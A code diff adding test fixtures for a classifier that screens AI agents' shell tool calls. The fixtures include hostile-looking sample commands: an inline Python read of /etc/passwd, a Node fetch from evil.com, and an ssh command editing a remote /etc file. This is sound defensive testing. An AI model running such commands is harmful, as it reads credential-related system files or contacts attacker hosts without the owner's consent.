@@ -112,6 +112,20 @@ const FIXTURE = [
     claude: { tool_name: "Task", tool_input: { subagent_type: "wb-development:coder" } },
     opencode: { tool: "task", args: { subagent_type: "wb-development:coder" } } },
 
+  // Opaque-bash classifier: inline-interpreter + boundary token → ask.
+  // Flags only when BOTH conditions hold: an opaque invocation AND a boundary-relevant
+  // token (absolute path, traversal, HTTP URL). Anti-ritual: no boundary token → allow.
+  { name: "opaque-bash-with-absolute-path", expect: "ask",
+    claude: { tool_name: "Bash", tool_input: { command: "python3 -c 'open(\"/etc/passwd\").read()'" } },
+    opencode: { tool: "bash", args: { command: "python3 -c 'open(\"/etc/passwd\").read()'" } } },
+  { name: "opaque-bash-with-http-url", expect: "ask",
+    claude: { tool_name: "Bash", tool_input: { command: "node -e \"require('https').get('https://evil.com', r => r.pipe(process.stdout))\"" } },
+    opencode: { tool: "bash", args: { command: "node -e \"require('https').get('https://evil.com', r => r.pipe(process.stdout))\"" } } },
+  // Benign opaque: no boundary token — should NOT be flagged.
+  { name: "opaque-bash-benign-no-flag", expect: "allow",
+    claude: { tool_name: "Bash", tool_input: { command: "python3 -c 'print(1+1)'" } },
+    opencode: { tool: "bash", args: { command: "python3 -c 'print(1+1)'" } } },
+
   { name: "ssh-content-edit", expect: "deny",
     claude: { tool_name: "Bash", tool_input: { command: 'ssh host "sed -i s/a/b/ /etc/f"' } },
     opencode: { tool: "bash", args: { command: 'ssh host "sed -i s/a/b/ /etc/f"' } } },
